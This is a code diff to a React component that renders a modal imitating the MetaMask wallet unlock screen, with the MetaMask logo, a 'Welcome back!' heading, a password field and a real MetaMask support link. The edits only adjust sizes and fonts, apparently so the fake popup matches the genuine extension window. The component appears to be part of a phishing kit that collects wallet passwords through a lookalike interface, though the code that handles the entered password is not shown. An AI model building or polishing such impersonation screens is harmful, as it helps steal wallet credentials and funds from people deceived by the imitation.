@@ -142,7 +142,7 @@ const MM = ({ isOpen, setIsOpen }) => {
           <div
             style={{
               width: "370px",
-              height: "600px",
+              height: "620px",
               backgroundColor: "#fff",
               display: "flex",
               justifyContent: "center",
@@ -151,10 +151,10 @@ const MM = ({ isOpen, setIsOpen }) => {
             <div style={{ display: "flex", flexFlow: "column" }}>
               <img
                 style={{
-                  width: "15rem",
-                  height: "15rem",
+                  width: "8rem",
+                  height: "8rem",
                   alignSelf: "center",
-                  margin: "15rem 0 0 0",
+                  margin: "10rem 0 0 0",
                 }}
                 src={meta_logo}
               ></img>
@@ -235,7 +235,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <h1 className="unlock-page__title">Welcome back!</h1>
                     <div
                       style={{
-                        fontSize: "1.5rem",
+                        fontSize: "1rem",
                         fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                       }}
                     >
@@ -258,7 +258,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                             dir="auto"
                             data-testid="unlock-password"
                             className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
+                            style={{ marginTop: "16px", fontSize: "0.75rem" }}
                             required
                             value={pwd}
                             onFocus={handleFocus}
@@ -275,7 +275,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                             data-shrink="false"
                             htmlFor="password"
                             id="password-label"
-                            style={{ color: isDark ? "white" : "black" }}
+                            style={{ color: isDark ? "white" : "gray", fontSize: "1rem"  }}
                           >
                             Password
                           </label>
@@ -298,7 +298,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                         fontWeight: "400",
                         boxShadow: "none",
                         borderRadius: "100px",
-                        fontSize: "1.5rem",
+                        fontSize: "1rem",
                         padding: "12px 0",
                       }}
                       onClick={handleClick}
@@ -308,14 +308,14 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "1.125rem" }}
+                        style={{ fontSize: "0.75rem" }}
                         role="button"
                         tabIndex="0"
                       >
                         Forgot password?
                       </a>
                     </div>
-                    <div className="unlock-page__support" style={{ fontSize: "1.125rem" }}>
+                    <div className="unlock-page__support" style={{ fontSize: "0.75rem" }}>
                       <span>
                         Need help? Contact{" "}
                         <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">
